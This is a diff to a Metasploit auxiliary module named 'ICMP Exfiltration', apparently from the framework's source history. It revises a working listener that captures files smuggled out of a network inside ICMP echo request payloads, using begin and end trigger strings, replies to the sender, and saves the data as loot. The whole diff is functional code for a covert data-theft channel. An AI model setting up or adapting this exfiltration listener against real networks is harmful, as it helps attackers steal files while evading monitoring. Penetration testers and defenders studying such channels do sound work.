@@ -1,5 +1,5 @@
 ##
-# $Id:$
+# $Id$
 ##
 
 ##
@@ -19,36 +19,38 @@ class Metasploit3 < Msf::Auxiliary
     def initialize
         super(
             'Name'        => 'ICMP Exfiltration',
-            'Version'     => '$Revision: $',
+            'Version'     => '$Revision$',
             'Description' => %q{
                 This module is designed to provide a server-side component to receive and store files
                 exfiltrated over ICMP.
 
                 To use this module you will need to send an initial ICMP echo request containing the
-                specified trigger (defaults to 'BOF:') followed by the filename being sent. All data
+                specified trigger (defaults to '^BOF:') followed by the filename being sent. All data
                 received from this source will automatically be added to the receive buffer until an
-                ICMP echo request containing 'EOL' is received.
+                ICMP echo request containing a specific end command (defaults to 'EOL') is received.
             },
             'Author'      =>     'Chris John Riley',
             'License'     =>     MSF_LICENSE,
             'References'    =>
                 [
                     # general
-                    ['URL', 'http://blog.c22.cc']
+                    ['URL', 'http://blog.c22.cc'],
+                    # packetfu
+                    ['URL','http://code.google.com/p/packetfu/']
                 ]
         )
 
         register_options([
-            OptString.new('TRIGGER',      [true, 'Trigger to listen for (followed by filename', '^BOF:']),
-            OptString.new('RESPONSE',        [true, 'Data to respond when trigger matches', 'SEND']),
+            OptString.new('TRIGGER',      [true, 'Trigger to listen for (followed by filename)', '^BOF:']),
+            OptString.new('EOF_TRIGGER',      [true, 'End of File command', '^EOF']),
+            OptString.new('RESPONSE',        [true, 'Data to respond when initial trigger matches', 'BEGIN']),
             OptString.new('BPF_FILTER',      [true, 'BFP format filter to listen for', 'icmp']),
             OptString.new('INTERFACE',     [false, 'The name of the interface']),
         ], self.class)
 
         register_advanced_options([
-            OptString.new('CLOAK',    	[false, 'Create the response packet using a specific OS fingerprint (windows, linux, freebsd)', 'linux']),
-            OptString.new('EOF_TRIGGER',    	[true, 'Alter the end of file trigger', '^EOF']),
-            OptBool.new('PROMISC',         [false, 'Enable/Disable promiscuous mode', false]),
+            OptString.new('CLOAK',    [false, 'Create the response packet using a specific OS fingerprint (windows, linux, freebsd)', 'linux']),
+            OptBool.new('PROMISC',          [false, 'Enable/Disable promiscuous mode', false]),
         ], self.class)
 
         deregister_options('SNAPLEN','FILTER','PCAPFILE','RHOST','UDP_SECRET','GATEWAY','NETMASK', 'TIMEOUT')
@@ -70,7 +72,7 @@ class Metasploit3 < Msf::Auxiliary
             @record = false
 
             if @promisc
-                 print_status "Warning: Promiscuous mode enabled"
+                 print_status("Warning: Promiscuous mode enabled. This may cause issues!")
             end
 
             # start listner
@@ -80,14 +82,14 @@ class Metasploit3 < Msf::Auxiliary
             print_error(ex.message)
         ensure
             storefile
-            print_status "Stopping ICMP listener on %s (%s)" % [@interface, @iface_ip]
+            print_status("Stopping ICMP listener on %s (%s)" % [@interface, @iface_ip])
         end
     end
 
     def icmplistener
-        # start listener
+        # start icmp listener
 
-        print_good "ICMP Listener started on %s (%s). Monitoring for packets containing %s" % [@interface, @iface_ip, @trigger]
+        print_good("ICMP Listener started on %s (%s). Monitoring for trigger packet containing %s" % [@interface, @iface_ip, @trigger])
         cap = PacketFu::Capture.new(:iface => @interface, :start => true, :filter => @filter, :promisc => @promisc)
         loop {
             cap.stream.each do |pkt|
@@ -96,7 +98,7 @@ class Metasploit3 < Msf::Auxiliary
 
                 if packet.is_icmp? and data =~ /#{@trigger}/
 
-                    print_status "#{Time.now}: SRC:%s ICMP (type %d code %d) DST:%s" % [packet.ip_saddr, packet.icmp_type, packet.icmp_code, packet.ip_daddr]
+                    print_status("#{Time.now}: SRC:%s ICMP (type %d code %d) DST:%s" % [packet.ip_saddr, packet.icmp_type, packet.icmp_code, packet.ip_daddr])
 
                     # detect and warn if system is responding to ICMP echo requests
                     # suggested fixes:
@@ -106,11 +108,11 @@ class Metasploit3 < Msf::Auxiliary
                     # (Windows cont.) netsh firewall set opmode mode = ENABLE
 
                     if packet.icmp_type == 0 and packet.icmp_code == 0 and packet.ip_saddr == @iface_ip
-                        print_error "Dectected ICMP echo response. The client may receive multiple repsonses"
+                        raise RuntimeError , "Dectected ICMP echo response. Disable OS ICMP handling!"
                     end
 
                     if @record
-                        print_error "New file started without saving old data"
+                        print_error("New file started without saving old data")
                         storefile
                     end
 
@@ -122,7 +124,7 @@ class Metasploit3 < Msf::Auxiliary
                     @record_data = ''
                     @filename = data[(@trigger.length-1)..-1].strip # set filename from icmp payload
 
-                    print_good "Beginning capture of %s data" % @filename
+                    print_good("Beginning capture of %s data" % @filename)
 
                     # create response packet icmp_pkt
                     icmp_packet
@@ -139,17 +141,9 @@ class Metasploit3 < Msf::Auxiliary
                     # check for EOF marker, if not continue recording
 
                     if data =~ /#{@eoftrigger}/
-                        print_status "%d bytes of data recevied in total" % @record_data.length
-                        print_good "End of File received. Saving %s to loot" % @filename
+                        print_status("%d bytes of data recevied in total" % @record_data.length)
+                        print_good("End of File received. Saving %s to loot" % @filename)
                         storefile
-
-                        # turn off recording and clear status
-                        @record = false
-                        @record_host = ''
-                        @record_data = ''
-                    else
-                        @record_data << data.to_s()
-                        print_status "Received %s bytes of data from %s" % [data.length, packet.ip_saddr]
                         @p_icmp = packet
 
                         # create response packet icmp_pkt
@@ -160,8 +154,26 @@ class Metasploit3 < Msf::Auxiliary
                         else
                             # send response packet icmp_pkt
                             send_icmp
-                    end
+                        end
 
+                        # turn off recording and clear status
+                        @record = false
+                        @record_host = ''
+                        @record_data = ''
+                    else
+                        @record_data << data.to_s()
+                        print_status("Received %s bytes of data from %s" % [data.length, packet.ip_saddr])
+                        @p_icmp = packet
+
+                        # create response packet icmp_pkt
+                        icmp_packet
+
+                        if not @icmp_response
+                            raise RuntimeError , "Could not build ICMP resonse"
+                        else
+                            # send response packet icmp_pkt
+                            send_icmp
+                        end
                     end
                 end
             end
@@ -203,7 +215,7 @@ class Metasploit3 < Msf::Auxiliary
         begin
             @icmp_response.to_w(iface = @interface)
             if datastore['VERBOSE']
-                print_good "Response sent to %s containing %d bytes of data" % [@dst_ip, @response.length]
+                print_good("Response sent to %s containing %d bytes of data" % [@dst_ip, @response.length])
             end
         rescue  =>  ex
             print_error(ex.message)
@@ -218,9 +230,9 @@ class Metasploit3 < Msf::Auxiliary
                 @src_ip,
                 @record_data,
                 @filename,
-                "ICMP Exfiltrated Data "
+                "ICMP Exfiltrated Data"
                 )
-        print_good "Incoming file %s saved to loot" % @filename
-        print_good "Loot filename: %s" % loot
+        print_good("Incoming file %s saved to loot" % @filename)
+        print_good("Loot filename: %s" % loot)
     end
 end
